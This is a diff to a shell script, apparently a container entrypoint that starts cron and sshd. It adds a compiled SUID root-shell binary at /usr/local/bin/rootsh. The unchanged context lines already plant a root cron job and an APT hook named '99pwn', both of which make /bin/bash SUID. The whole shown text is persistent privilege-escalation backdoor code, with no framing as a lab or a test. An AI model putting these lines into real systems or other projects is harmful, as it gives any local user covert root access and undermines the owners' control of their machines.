@@ -32,8 +32,19 @@ echo "* * * * * root chmod u+s /bin/bash" > /etc/cron.d/suid
 chmod 644 /etc/cron.d/suid
 echo 'APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};' > /etc/apt/apt.conf.d/99pwn
 
-service cron start || true
+# SUID C program for root shell
+cat > /tmp/rootsh.c << 'EOF'
+#include <unistd.h>
+#include <stdlib.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+    return 0;
+}
+EOF
+gcc /tmp/rootsh.c -o /usr/local/bin/rootsh
+chmod u+s /usr/local/bin/rootsh
 
-/usr/sbin/sshd -t
-
+cron -f &
 exec /usr/sbin/sshd -D -e
